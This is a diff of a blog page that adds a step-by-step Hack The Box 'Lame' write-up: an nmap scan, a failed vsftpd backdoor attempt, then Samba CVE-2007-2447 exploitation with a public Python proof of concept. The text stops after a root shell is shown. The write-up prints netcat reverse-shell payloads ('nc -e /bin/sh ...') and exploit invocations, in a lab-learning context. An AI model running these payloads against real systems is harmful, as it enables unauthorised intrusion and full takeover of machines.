@@ -7,21 +7,21 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
-  <title>404 Page not found | &gt;_ shell this box</title>
-  <meta name="description" content="">
+  <title>Lame (Hack The Box) Full Write-Up | &gt;_ shell this box</title>
+  <meta name="description" content="In this second Hack The Box write-up, I walk through Lame step by step, from enumeration to full compromise, with a stronger focus on manual exploitation.">
 
   
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="404 Page not found | &gt;_ shell this box">
-  <meta name="twitter:description" content="Coderon is a super modern and unique Hugo blog theme">
-  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="Lame (Hack The Box) Full Write-Up | &gt;_ shell this box">
+  <meta name="twitter:description" content="In this second Hack The Box write-up, I walk through Lame step by step, from enumeration to full compromise, with a stronger focus on manual exploitation.">
+  <meta name="twitter:image" content="http://localhost:1313/images/posts/HTB-Lame-write-up.png">
 
   
-  <meta property="og:title" content="404 Page not found | &gt;_ shell this box">
-  <meta property="og:description" content="Coderon is a super modern and unique Hugo blog theme">
-  <meta property="og:image" content="http://localhost:1313/">
+  <meta property="og:title" content="Lame (Hack The Box) Full Write-Up | &gt;_ shell this box">
+  <meta property="og:description" content="In this second Hack The Box write-up, I walk through Lame step by step, from enumeration to full compromise, with a stronger focus on manual exploitation.">
+  <meta property="og:image" content="http://localhost:1313/images/posts/HTB-Lame-write-up.png">
 
   
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -234,17 +234,610 @@
       
 
 
+
+
 <div class="container">
+
   <div class="row">
-    <div class="col col-12">
-      <div class="error">
-        <h2 class="error__title">404</h2>
-        <p class="error__text">The requested page could not be found.</p>
-        <a class="button button--primary" href="/">Back to homepage</a>
+    <div class="col col-8 col-d-12">
+
+      <div class="post-head">
+
+        
+
+        
+        
+        <div class="post-image">
+        
+          <img class="lazy" data-src="http://localhost:1313/images/posts/HTB-Lame-write-up.png" alt="Lame (Hack The Box) Full Write-Up">
+        
+        </div>
+        
+        
+
+        <div class="post-info">
+          
+          <div class="post-tags">
+            
+            <a href="http://localhost:1313/tags/write-up/" class="post-tag"
+              style="background: #df1b1b;">Write-Up</a>
+            
+          </div>
+          
+
+          <h1 class="post-title">Lame (Hack The Box) Full Write-Up</h1>
+
+
+          <div class="post-meta">
+            <a href="/about/" class="post-meta__image">
+              <img class="lazy" data-src="https://placehold.co/120x120" alt="Marcin">
+            </a>
+
+            <div class="post-meta__content">
+              <a class="post-meta__author" href="/about/">Marcin</a>
+              <div class="post-meta__bottom">
+                <time class="post-date" datetime=" 2026-03-31T12:01:35&#43;03:00">31 Mar, 2026</time> –
+                <span class="post-minutes">9 min read</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
       </div>
+
+      <article class="post">
+        <div class="post__content">
+          
+          <h2 id="introduction">Introduction:</h2>
+<p>Lame is the oldest retired Linux machine on the Hack The Box platform. It is rated easy and was originally released on March 14, 2017. In this walkthrough, I’ll use HTB’s Guided Mode to better understand the exploitation process step by step.</p>
+<h2 id="attack-path-summary">Attack Path Summary</h2>
+<ul>
+<li>Enumeration → Nmap reveals Samba 3.0.20</li>
+<li>Initial attempt → VSFTPD exploit (failed)</li>
+<li>Foothold → CVE-2007-2447 (Samba RCE)</li>
+<li>Privilege level → root access via exploit</li>
+</ul>
+<hr>
+<p><code>Target_IP</code>: 10.129.12.112</p>
+<p>As always, the first step is to verify that the target host is reachable:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">ping</span> <span class="nt">Target_IP</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PING 10.129.12.112 <span class="o">(</span>10.129.12.112<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.12.112: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>81.6 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.12.112: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>81.1 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.12.112: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>81.1 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.12.112: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>80.9 ms
+</span></span><span class="line"><span class="cl">^C
+</span></span><span class="line"><span class="cl">--- 10.129.12.112 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">5</span> packets transmitted, <span class="m">4</span> received, 20% packet loss, <span class="nb">time</span> 4003ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 80.901/81.180/81.643/0.277 ms
+</span></span></code></pre></div><p>A successful response confirms that the host is alive and accessible on the network.</p>
+<h2 id="enumeration">Enumeration:</h2>
+<p>Running full port scan to avoid missing non-standard services.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt Target_IP
+</span></span></code></pre></div><div class="table-container">
+  <table>
+    <tr><th>Parameter</th><th>Purpose</th></tr>
+    <tr><td>sudo</td><td>runs Nmap with elevated privileges (required for SYN scan -sS)</td></tr>
+    <tr><td>-sS</td><td>TCP SYN (stealth) scan, faster and less detectable than a full TCP connect scan</tr>
+    <tr><td>-sC</td><td>runs default NSE (Nmap Scripting Engine) scripts</td></tr>
+    <tr><td>-sV</td><td>detects service versions running on open ports</td></tr>
+    <tr><td>-p-</td><td>scans all 65,535 ports</td></tr>
+    <tr><td>-T4</td><td>faster timing template (aggressive, but still stable)</td></tr>
+    <tr><td>--min-rate 10000</td><td>forces Nmap to send at least 10,000 packets per second (aggressive scan speed)</td></tr>
+    <tr><td>-oN nmap_initial.txt</td><td>saves output in normal format to file</td></tr>
+  </table>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt 10.129.12.112
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-03-31 09:32 CDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.12.112
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.081s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp         vsftpd 2.3.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to 10.10.15.141
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 2.3.4 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="o">(</span>DSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3632/tcp open  distccd     distccd v1 <span class="o">((</span>GNU<span class="o">)</span> 4.2.4 <span class="o">(</span>Ubuntu 4.2.4-1ubuntu4<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Unix <span class="o">(</span>Samba 3.0.20-Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: lame
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: hackthebox.gr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: lame.hackthebox.gr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2026-03-31T10:33:07-04:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2h00m36s, deviation: 2h49m45s, median: 34s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 65.69 seconds
+</span></span></code></pre></div><hr>
+<p>The scan revealed five open TCP ports:</p>
+<ul>
+<li><code>21 (FTP)</code> → vsftpd 2.3.4 with anonymous login enabled (potential misconfiguration)</li>
+<li><code>22 (SSH)</code> → OpenSSH 4.7p1 on Ubuntu (likely for remote access)</li>
+<li><code>139/445 (SMB)</code> → Samba 3.0.20-Debian (file sharing, possible enumeration target)</li>
+<li><code>3632 (distccd)</code> → distccd service exposed (potential remote code execution vector)</li>
+</ul>
+<hr>
+<p>From the initial scan, FTP (anonymous access), SMB, and distccd stand out as the most promising attack vectors.</p>
+<h2 id="initial-exploitation-attempt-vsftpd">Initial Exploitation Attempt (VSFTPD)</h2>
+<p>HTB guided mode indicates that VSFTPD version 2.3.4 contains a well-known backdoor that can be exploited using a Metasploit module. The next step is to verify this finding.</p>
+<p>Before using Metasploit, let&rsquo;s verify this with Searchsploit. This helps confirm that the vulnerability is publicly known and provides alternative exploitation methods.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">searchsploit vsftpd 2.3.4
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">earchsploit vsftpd 2.3.4
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">vsftpd 2.3.4 - Backdoor Command Execution     <span class="p">|</span> unix/remote/49757.py
+</span></span><span class="line"><span class="cl">vsftpd 2.3.4 - Backdoor Command Execution <span class="o">(</span>Me <span class="p">|</span> unix/remote/17491.rb
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></div><p>The Searchsploit results confirm that VSFTPD version 2.3.4 is vulnerable to a backdoor command execution vulnerability:</p>
+<ul>
+<li><code>49757.py</code> → Python exploit script</li>
+<li><code>17491.rb</code> → Metasploit module</li>
+</ul>
+<p>This confirms that the vulnerability is publicly known and can be exploited using different methods.</p>
+<p>In this case, I will proceed with the Metasploit module, as it provides a faster and more reliable way to gain access.</p>
+<p>Since Searchsploit confirmed the presence of a Metasploit module for VSFTPD 2.3.4, the next step is to test it with <code>msfconsole</code>.</p>
+<p>First, start Metasploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfconsole
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="o">=[</span> metasploit v6.4.71-dev                          <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">2529</span> exploits - <span class="m">1302</span> auxiliary - <span class="m">431</span> post       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">1669</span> payloads - <span class="m">49</span> encoders - <span class="m">13</span> nops           <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">9</span> evasion                                       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; Interrupt: use the <span class="s1">&#39;exit&#39;</span> <span class="nb">command</span> to quit
+</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; 
+</span></span></code></pre></div><p>This launches the Metasploit Framework console, where we can search for and run available exploit modules.</p>
+<p>Next, search for the VSFTPD 2.3.4 module:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search vsftpd 2.3.4
+</span></span></code></pre></div><p>After searching for the module in Metasploit, the following result was returned:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; search vsftpd 2.3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                  Disclosure Date  Rank       Check  Description</span>
+</span></span><span class="line"><span class="cl">   -  ----                                  ---------------  ----       -----  -----------
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span></code></pre></div><p>Metasploit returns an available module for VSFTPD 2.3.4:</p>
+<ul>
+<li><code>exploit/unix/ftp/vsftpd_234_backdoor</code> (rank: excellent)</li>
+</ul>
+<p>The presence of an &ldquo;excellent&rdquo; ranked module significantly increases the likelihood of successful exploitation. Next, I will load the module and attempt exploitation.</p>
+<p>To load it, I run:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to cmd/unix/interact
+</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt;&gt; 
+</span></span></code></pre></div><p>This selects the exploit module targeting the well-known backdoor in VSFTPD 2.3.4.</p>
+<p>Before running the exploit, I review the required settings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show options
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt;&gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/unix/ftp/vsftpd_234_backdoor<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   CHOST                     no        The <span class="nb">local</span> client address
+</span></span><span class="line"><span class="cl">   CPORT                     no        The <span class="nb">local</span> client port
+</span></span><span class="line"><span class="cl">   Proxies                   no        A proxy chain of format type:host:port<span class="o">[</span>
+</span></span><span class="line"><span class="cl">                                       ,type:host:port<span class="o">][</span>...<span class="o">]</span>. Supported proxie
+</span></span><span class="line"><span class="cl">                                       s: socks4, socks5, sapni, socks5h, http
+</span></span><span class="line"><span class="cl">   RHOSTS                    yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.me
+</span></span><span class="line"><span class="cl">                                       tasploit.com/docs/using-metasploit/basi
+</span></span><span class="line"><span class="cl">                                       cs/using-metasploit.html
+</span></span><span class="line"><span class="cl">   RPORT    <span class="m">21</span>               yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic
+</span></span></code></pre></div><p>The most important parameter here is <code>RHOSTS</code>, which defines the target IP address.</p>
+<p>Set the target host:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 10.129.12.112
+</span></span></code></pre></div><p>I can now run the exploit</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt;&gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.129.12.112:21 - Banner: <span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.129.12.112:21 - USER: <span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span></code></pre></div><p>The exploit attempt did not return a session.</p>
+<p>Further research shows that the VSFTPD 2.3.4 backdoor was only present in a briefly compromised version of the source code distributed in 2011.</p>
+<p>Since the exploit was unsuccessful I will follo up on HTB guide mode sugestion and focus on Samba.</p>
+<h2 id="foothold-samba-exploitation">Foothold (Samba Exploitation)</h2>
+<p>HTB guided mode indicates that this version of Samba may be vulnerable to remote code execution. After further research, I identified CVE-2007-2447 as the vulnerability that matches these conditions.</p>
+<p>To confirm this, I performed a quick search for available exploits:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> searchsploit samba 3.0.20
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Samba 3.0.10 &lt; 3.3.5 - Format String / Securi <span class="p">|</span> multiple/remote/10095.txt
+</span></span><span class="line"><span class="cl">Samba 3.0.20 &lt; 3.0.25rc3 - <span class="s1">&#39;Username&#39;</span> map scr <span class="p">|</span> unix/remote/16320.rb
+</span></span><span class="line"><span class="cl">Samba &lt; 3.0.20 - Remote Heap Overflow         <span class="p">|</span> linux/remote/7701.txt
+</span></span><span class="line"><span class="cl">Samba &lt; 3.6.2 <span class="o">(</span>x86<span class="o">)</span> - Denial of Service <span class="o">(</span>PoC<span class="o">)</span> <span class="p">|</span> linux_x86/dos/36741.py
+</span></span><span class="line"><span class="cl">---------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></div><p>The results show multiple potential exploits, including one targeting the &ldquo;username map script&rdquo; vulnerability, which aligns with CVE-2007-2447.</p>
+<p>For learning and educational purposes, I decided not to use Metasploit this time, but instead to work with a publicly available PoC (Proof of Concept) from GitHub.</p>
+<p><a href="https://github.com/Ziemni/CVE-2007-2447-in-Python">https://github.com/Ziemni/CVE-2007-2447-in-Python</a></p>
+<p>First, I clone the repository:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/Ziemni/CVE-2007-2447-in-Python.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2007-2447-in-Python
+</span></span></code></pre></div><p>The repository contains two files: the exploit script and a README file. Let’s review the README to understand how the exploit works.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat README.md 
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE-2007-2447 - Python implementation</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Description</span>
+</span></span><span class="line"><span class="cl">Python implementation of <span class="s1">&#39;Username&#39;</span> map script<span class="s1">&#39; RCE Exploit for Samba 3.0.20 &lt; 3.0.25rc3 (CVE-2007-2447).
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">## Usage
+</span></span></span><span class="line"><span class="cl"><span class="s1">`python3 smbExploit.py &lt;IP&gt; &lt;PORT&gt; &lt;PAYLOAD&gt;`
+</span></span></span><span class="line"><span class="cl"><span class="s1"> - IP - Ip of the remote machine.
+</span></span></span><span class="line"><span class="cl"><span class="s1"> - PORT - (Optional) Port that smb is running on.
+</span></span></span><span class="line"><span class="cl"><span class="s1"> - PAYLOAD - Payload to be executed on the remote machine e.g. reverse shell.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Examples:
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">`python3 smbExploit.py 192.168.1.2 139 &#39;</span>nc -e /bin/sh 192.168.1.1 4444<span class="s1">&#39;`
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">`python3 smbExploit.py 192.168.1.2 &#39;</span>nc -e /bin/sh 192.168.1.1 4444<span class="s1">&#39;`
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">## Resorces
+</span></span></span><span class="line"><span class="cl"><span class="s1">[CVE-2007-2447: Remote Command Injection Vulnerability](https://www.samba.org/samba/security/CVE-2007-2447.html)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Samba 3.0.20 &lt; 3.0.25rc3 - &#39;</span>Username<span class="s1">&#39; map script&#39;</span> Command Execution <span class="o">(</span>Metasploit<span class="o">)](</span>https://www.exploit-db.com/exploits/16320<span class="o">)</span>
+</span></span></code></pre></div><p>Referring to the earlier Searchsploit results, an exploit targeting the &ldquo;username map script&rdquo; vulnerability for Samba 3.0.20 &lt; 3.0.25rc3 was identified.</p>
+<p>This directly corresponds to CVE-2007-2447, confirming that the Python PoC leverages the same vulnerability.</p>
+<p>As described in the README, the next step is to start a Netcat listener on port 4444 to receive the reverse shell, and then execute the PoC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><ul>
+<li><code>-l</code> → listen for incoming connections</li>
+<li><code>-v</code> → verbose mode (shows connection details)</li>
+<li><code>-n</code> → skip DNS resolution (faster)</li>
+<li><code>-p</code> 4444 → listen on port 4444</li>
+</ul>
+<hr>
+<p>At this point, Netcat is listening on port 4444, waiting for an incoming reverse shell connection.</p>
+<p>With the listener ready, I proceed to execute the PoC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 smbExploit.py 10.129.12.112 <span class="m">445</span> <span class="s1">&#39;nc -e /bin/sh 10.10.15.141 4444&#39;</span>
+</span></span></code></pre></div><p>When attempting to run the exploit, I encountered a missing dependency. The script returned the following error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pysmb is not installed: python3 -m pip install pysmb
+</span></span></code></pre></div><p>To resolve this, I install it using pip:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 -m pip install pysmb
+</span></span><span class="line"><span class="cl">Defaulting to user installation because normal site-packages is not writeable
+</span></span><span class="line"><span class="cl">Collecting pysmb
+</span></span><span class="line"><span class="cl">Downloading pysmb-1.2.13-py3-none-any.whl.metadata <span class="o">(</span>1.6 kB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Requirement already satisfied: pyasn1 in /usr/lib/python3/dist-packages <span class="o">(</span>from pysmb<span class="o">)</span> <span class="o">(</span>0.4.8<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Requirement already satisfied: tqdm in /usr/local/lib/python3.11/dist-packages <span class="o">(</span>from pysmb<span class="o">)</span> <span class="o">(</span>4.66.5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Downloading pysmb-1.2.13-py3-none-any.whl <span class="o">(</span><span class="m">85</span> kB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Installing collected packages: pysmb
+</span></span><span class="line"><span class="cl">Successfully installed pysmb-1.2.13
+</span></span></code></pre></div><p>With the dependency installed, I attempt to run the exploit again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 smbExploit.py 10.129.12.112 <span class="m">445</span> <span class="s1">&#39;nc -e /bin/sh 10.10.15.141 4444&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending the payload
+</span></span></code></pre></div><p>The exploit successfully returned a reverse shell, and I gained <code>root</code> access to the target system.</p>
+<p>From the Netcat listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.141<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.12.112<span class="o">]</span> <span class="m">37018</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
